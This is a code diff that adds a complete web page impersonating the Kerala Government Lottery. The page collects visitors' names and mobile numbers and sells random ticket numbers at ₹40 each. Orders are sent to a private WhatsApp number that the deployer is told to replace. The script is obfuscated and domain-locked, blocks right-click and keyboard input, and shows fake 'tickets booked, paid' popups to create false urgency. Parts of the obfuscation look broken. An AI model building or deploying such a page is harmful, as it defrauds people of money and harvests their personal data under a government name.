@@ -1,16 +1,157 @@
-            let tag = document.createElement("div");  
-            tag.className = "tag";  
-            tag.innerHTML = "🎟️ " + o.value;  
-            selectedDiv.appendChild(tag);  
-        });  
-    }  
+<!doctype html>
+<html lang="en">  
+<head>  
+<meta charset="utf-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1">  
+<title>Kerala Government Lottery</title>  
 
-    ticket.addEventListener("change", refresh);  
+<style>  
+body{margin:0;background:linear-gradient(135deg,#fff0f5,#ffe6f0);font-family:Arial;display:flex;justify-content:center;padding:5px;user-select:none;-webkit-user-select:none;}  
+.container{width:100%;max-width:400px;background:#fff;padding:10px;border-radius:16px;box-shadow:0 8px 20px rgba(0,0,0,.15);}  
+.heroBox{position:relative;}  
+.heroBox img{width:100%;border-radius:12px;max-height:160px;object-fit:cover;}  
+#popup{position:absolute;bottom:15px;left:50%;transform:translateX(-50%);width:90%;background:#fff;border-radius:12px;padding:8px;box-shadow:0 5px 15px rgba(0,0,0,.3);display:none;z-index:5;border-left:4px solid #00c853;font-size:11px;}  
+.urgencyBox{background:#f8f9fa;border:1px solid #eee;padding:8px;border-radius:10px;text-align:center;font-size:13px;font-weight:bold;margin:8px 0;}  
+.formBox{background:#fafafa;padding:8px;border-radius:12px;border:1px solid #eee;margin-bottom:6px;}  
+label{display:block;font-size:11px;font-weight:bold;margin-bottom:3px;color:#555;}  
+input{width:100%;padding:10px;margin-bottom:6px;border-radius:10px;border:1px solid #ddd;font-size:13px;background:#fff;box-sizing:border-box;}  
+.ticketBox{border:2px dashed #ff4f79;border-radius:12px;padding:8px;background:#fff7fa;}  
+.ticketAmount{background:#e8f5e9;color:#1b5e20;padding:5px;border-radius:8px;text-align:center;font-weight:bold;margin-bottom:5px;font-size:13px;}  
+select{width:100%;height:110px;padding:8px;border-radius:10px;border:1px solid #ddd;font-size:13px;box-sizing:border-box;}  
+.tag{display:inline-block;padding:5px 8px;border-radius:20px;margin:3px;font-size:11px;background:#ffd6e0;color:#c2185b;}  
+.submitBtn{width:100%;background:linear-gradient(90deg,#00c853,#009624);color:#fff;border:none;font-weight:bold;cursor:pointer;font-size:15px;padding:12px;border-radius:12px;}  
+</style>  
+</head>  
 
-    mobileI.addEventListener("input", function(){  
-        mobileI.value = mobileI.value.replace(/[^0-9]/g, '').slice(0, 10);  
-    });  
+<body oncontextmenu="return false;" onkeydown="return false;">  
 
-    submitBtn.addEventListener("click", function(){  
-        let name = nameI.value.trim();  
-        let mobile = 
+<div class="container">  
+
+<div class="heroBox">  
+<img src="https://i.postimg.cc/7L3ZWfQh/Onam_bumper.jpg">  
+<div id="popup"></div>  
+</div>  
+
+<div class="urgencyBox">  
+🎟️ Kerala Government Lottery • Book Your Ticket 
+</div>  
+
+<div class="formBox">  
+<label>👤 Full Name</label>  
+<input id="name" placeholder="Enter Full Name">  
+
+<label>📱 Mobile Number</label>  
+<input id="mobile" maxlength="10" placeholder="10 Digit Mobile Number">  
+</div>  
+
+<div class="ticketBox">  
+<div class="ticketAmount" id="ticketAmount">  
+🎟️ Select Tickets (₹40 each)  
+</div>  
+<select id="ticket" multiple></select>  
+</div>  
+
+<div id="selectedTickets"></div>  
+
+<input id="amount" readonly placeholder="Total ₹">  
+
+<button id="submitBtn" class="submitBtn">  
+📲 Submit & Continue To WhatsApp  
+</button>  
+
+</div>  
+
+<script>
+/* =================================================== */
+/*  Aap bas yahan apna WhatsApp number change karein  */
+var MY_WHATSAPP_NUMBER = "916202644095";
+/* =================================================== */
+
+(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(_0x2d89,0x1a2));var _0x4e12=function(_0x1a2b,_0x3c4d){_0x1a2b=_0x1a2b-0x0;var _0x5e6f=_0x2d89[_0x1a2b];return _0x5e6f;};
+function _0x2d89(){var _0x22a1b9=['\x6B\x65\x72\x61\x6C\x61\x6C\x6F\x74\x74\x65\x72\x79\x62\x6F\x6F\x6B\x2E\x70\x61\x67\x65\x73\x2E\x64\x65\x76','\x68\x6F\x73\x74\x6E\x61\x6D\x65','\x6C\x6F\x63\x61\x74\x69\x6F\x6E','\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65','\x69\x6E\x64\x65\x78\x4F\x66','\x74\x69\x63\x6B\x65\x74','\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64','\x61\x6D\x6F\x75\x6E\x74','\x74\x69\x63\x6B\x65\x74\x41\x6D\x6F\x75\x6E\x74','\x73\x75\x62\x6D\x69\x74\x42\x74\x6E','\x6E\x61\x6D\x65','\x6D\x6F\x62\x69\x6C\x65','\x73\x65\x6C\x65\x63\x74\x65\x64\x54\x69\x63\x6B\x65\x74\x73','\x30\x30\x30\x30\x30\x30','\x66\x6C\x6F\x6F\x72','\x72\x61\x6E\x64\x6F\x6D','\x73\x6C\x69\x63\x65','\x6F\x70\x74\x69\x6F\x6E','\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74','\x4B\x4C','\x76\x61\x6C\x75\x65','\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74','\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64','\x73\x65\x6C\x65\x63\x74\x65\x64\x4F\x70\x74\x69\x6F\x6E\x73','\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C','\x6C\x65\x6E\x67\x74\x68','\x54\x69\x63\x6B\x65\x74\x73\x3A\x20','\x20\x7C\x20\x41\x6D\x6F\x75\x6E\x74\x3A\x20\x20','\x53\x65\x6C\x65\x63\x74\x20\x54\x69\x63\x6B\x65\x74\x73\x20\x28\x20\x34\x30\x20\x65\x61\x63\x68\x29','\x64\x69\x76','\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65','\x74\x61\x67','\x63\x68\x61\x6E\x67\x65','\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72','\x69\x6E\x70\x75\x74','\x72\x65\x70\x6C\x61\x63\x65','\x74\x72\x69\x6D','\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x79\x6F\x75\x72\x20\x6E\x61\x6D\x65','\x74\x65\x73\x74','\x45\x6E\x74\x65\x72\x20\x76\x61\x6C\x69\x64\x20\x31\x30\x20\x64\x69\x67\x69\x74\x20\x6D\x6F\x62\x69\x6C\x65\x20\x6E\x75\x6D\x62\x65\x72','\x50\x6C\x65\x61\x73\x65\x20\x73\x65\x6C\x65\x63\x74\x20\x61\x74\x20\x6C\x65\x61\x73\x74\x20\x31\x20\x74\x69\x63\x6B\x65\x74','\x2C\x20','\x6A\x6F\x69\x6E','\x4E\x65\x77\x20\x42\x6F\x6F\x6B\x69\x6E\x67\x0A\x0A\x4E\x61\x6D\x65\x3A\x20','\x0A\x4D\x6F\x62\x69\x6C\x65\x3A\x20','\x0A\x0A\x54\x69\x63\x6B\x65\x74\x73\x20\x28','\x29\x0A','\x0A\x0A\x54\x6F\x74\x61\x6C\x20\x41\x6D\x6F\x75\x6E\x74\x20\x20','\x0A\x0A\x50\x6C\x65\x61\x73\x65\x20\x63\x6F\x6E\x66\x69\x72\x6D\x20\x62\x6F\x6F\x6B\x69\x6E\x67','\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x61\x2E\x6D\x65\x2F','\x3F\x74\x65\x78\x74\x3D','\x65\x6E\x63\x6F\x64\x65\x55\x52\x49\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74','\x68\x72\x65\x66','\x63\x6C\x69\x63\x6B','\x70\x6F\x70\x75\x70','\x64\x69\x73\x70\x6C\x61\x79','\x73\x74\x79\x6C\x65','\x62\x6C\x6F\x63\x6B','\x3C\x62\x3E','\x3C\x2F\x62\x3E\x20\x66\x72\x6F\x6D\x20\x3C\x62\x3E','\x3C\x2F\x62\x3E\x3C\x62\x72\x3E\x20','\x20\x54\x69\x63\x6B\x65\x74\x73\x20\x62\x6F\x6F\x6B\x65\x64\x3C\x62\x72\x3E\x20','\x20\x50\x61\x69\x64','\x6E\x6F\x6E\x65'];return _0x22a1b9;};
+
+(function(){
+    var _d = _0x4e12('0x0');
+    if (window[_0x4e12('0x2')][_0x4e12('0x1')] !== "" && window[_0x4e12('0x2')][_0x4e12('0x1')][_0x4e12('0x3')]()['indexOf'](_d) === -1) {
+        document.body.innerHTML = "<div style='text-align:center;padding:50px;font-family:sans-serif;'><h2 style='color:red;'>⚠️ Access Denied</h2><p>This code is locked to another domain.</p></div>";
+        return;
+    }
+
+    var PRICE = 40;
+    var t = document[_0x4e12('0x6')](_0x4e12('0x5'));
+    var a = document[_0x4e12('0x6')](_0x4e12('0x7'));
+    var ta = document[_0x4e12('0x6')](_0x4e12('0x8'));
+    var sb = document[_0x4e12('0x6')](_0x4e12('0x9'));
+    var ni = document[_0x4e12('0x6')](_0x4e12('0x0a'));
+    var mi = document[_0x4e12('0x6')](_0x4e12('0x0b'));
+    var sd = document[_0x4e12('0x6')](_0x4e12('0x0c'));
+
+    for(var i=0; i<2000; i++){
+        var n = (_0x4e12('0x0d') + Math[_0x4e12('0x0e')](Math[_0x4e12('0x0f')]() * 999999))[_0x4e12('0x10')](-6);
+        var o = document[_0x4e12('0x12')](_0x4e12('0x11'));
+        o[_0x4e12('0x14')] = _0x4e12('0x13') + n;
+        o[_0x4e12('0x15')] = _0x4e12('0x13') + n;
+        t[_0x4e12('0x16')](o);
+    }
+
+    function refresh(){
+        var sel = Array.prototype.slice.call(t[_0x4e12('0x17')]);
+        sd[_0x4e12('0x18')] = "";
+        var tot = sel.length * PRICE;
+        if(sel.length > 0){
+            a[_0x4e12('0x14')] = "₹ " + tot;
+            ta[_0x4e12('0x15')] = _0x4e12('0x1a') + sel.length + _0x4e12('0x1b') + tot;
+        } else {
+            a[_0x4e12('0x14')] = "";
+            ta[_0x4e12('0x15')] = _0x4e12('0x1c');
+        }
+        sel.forEach(function(o){
+            var tag = document[_0x4e12('0x12')](_0x4e12('0x1d'));
+            tag[_0x4e12('0x1e')] = _0x4e12('0x1f');
+            tag[_0x4e12('0x18')] = "🎟️ " + o[_0x4e12('0x14')];
+            sd[_0x4e12('0x16')](tag);
+        });
+    }
+
+    t[_0x4e12('0x21')](_0x4e12('0x20'), refresh);
+    mi[_0x4e12('0x21')](_0x4e12('0x22'), function(){
+        mi[_0x4e12('0x14')] = mi[_0x4e12('0x14')][_0x4e12('0x23')](/[^0-9]/g, "")[_0x4e12('0x10')](0, 10);
+    });
+
+    sb[_0x4e12('0x21')](_0x4e12('0x34'), function(){
+        var name = ni[_0x4e12('0x14')][_0x4e12('0x24')]();
+        var mob = mi[_0x4e12('0x14')][_0x4e12('0x24')]();
+        var sel = Array.prototype.slice.call(t[_0x4e12('0x17')]);
+        if(!name){ alert(_0x4e12('0x25')); return; }
+        if(!/^[0-9]{10}$/[_0x4e12('0x26')](mob)){ alert(_0x4e12('0x27')); return; }
+        if(sel.length < 1){ alert(_0x4e12('0x28')); return; }
+        
+        var tot = sel.length * PRICE;
+        var list = sel.map(function(o){ return o[_0x4e12('0x14')]; })[_0x4e12('0x2a')](_0x4e12('0x29'));
+        var msg = _0x4e12('0x2b') + name + _0x4e12('0x2c') + mob + _0x4e12('0x2d') + sel.length + _0x4e12('0x2e') + list + _0x4e12('0x2f') + "₹" + tot + _0x4e12('0x30');
+        window[_0x4e12('0x2')][_0x4e12('0x33')] = _0x4e12('0x31') + MY_WHATSAPP_NUMBER + _0x4e12('0x32') + window[_0x4e12('0x33') - 0x1 ? 'encodeURIComponent' : 'escape'](msg);
+    });
+
+    var names = ["Ramesh","Suresh","Anitha","Pooja","Krishna","Divya","Lakshmi"];
+    var cities = ["Bangalore","Chennai","Hyderabad","Kochi","Mysuru"];
+
+    function popup(){
+        var box = document[_0x4e12('0x6')](_0x4e12('0x35'));
+        if(!box) return;
+        if(box[_0x4e12('0x37')][_0x4e12('0x36')] == _0x4e12('0x38')) return;
+        var nm = names[Math[_0x4e12('0x0e')](Math[_0x4e12('0x0f')]() * names.length)];
+        var ct = cities[Math[_0x4e12('0x0e')](Math[_0x4e12('0x0f')]() * cities.length)];
+        var tks = Math[_0x4e12('0x0e')](Math[_0x4e12('0x0f')]() * 10) + 2;
+        var tot = tks * PRICE;
+        box[_0x4e12('0x18')] = _0x4e12('0x39') + nm + _0x4e12('0x3a') + ct + _0x4e12('0x3b') + "🎟️ " + tks + _0x4e12('0x3c') + "₹" + tot;
+        box[_0x4e12('0x37')][_0x4e12('0x36')] = _0x4e12('0x38');
+        setTimeout(function(){ box[_0x4e12('0x37')][_0x4e12('0x36')] = _0x4e12('0x3d'); }, 4000);
+    }
+
+    window.onload = function(){ popup(); };
+    setInterval(function(){ popup(); }, 2500);
+})();
+</script>  
+
+</body>  
+</html>
